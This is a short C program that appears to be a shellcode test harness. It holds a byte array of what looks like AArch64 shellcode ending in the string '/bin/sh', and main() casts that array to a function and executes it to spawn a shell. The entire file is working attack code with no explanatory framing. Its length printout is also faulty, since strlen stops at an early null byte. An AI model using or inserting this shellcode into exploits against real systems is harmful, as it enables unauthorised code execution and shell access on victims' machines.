#include <stdio.h>
#include <string.h>
unsigned char shellcode[] = {
    0x06, 0x00, 0x00, 0x14, 0xe0, 0x03, 0x1e, 0xaa, 0xe1, 0x03, 0x1f, 0xaa,
    0xe2, 0x03, 0x1f, 0xaa, 0xa8, 0x1b, 0x80, 0xd2, 0x21, 0x00, 0x00, 0xd4,
    0xfb, 0xff, 0xff, 0x97, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68
};

int main(){
    fprintf(stdout,"Shellcode length: %d\n", strlen(shellcode));
    (*(void(*)()) shellcode)();
    return 0;
}
